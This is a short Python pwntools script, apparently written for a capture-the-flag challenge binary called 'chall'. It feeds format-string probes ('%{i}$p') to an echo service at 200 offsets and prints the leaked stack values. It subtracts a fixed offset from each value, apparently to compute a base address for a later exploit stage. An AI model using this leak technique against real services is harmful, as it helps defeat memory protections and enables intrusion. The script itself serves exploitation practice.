from pwn import *
elf = context.binary = ELF("./chall")

for i in range(200):
    p = process()
    p.sendline(f"%{i}$p")
    p.recvuntil(b"Welcome to echo service!\n")
    hasil = p.recvline().strip().decode()
    
    print(f"{i}: " + hasil)
    
    try:
        # Check if the leaked value is a valid hexadecimal address
        if hasil.startswith('0x'):
            leaked_value = int(hasil, 16)
            result = leaked_value - 0x1d3760
            print(f"Leaked value - 0x1d3760 = {hex(result)}")
        else:
            raise ValueError("Not a valid address")
    except (ValueError, TypeError):
        print(f"{i}: Skipping invalid value")

    p.close()
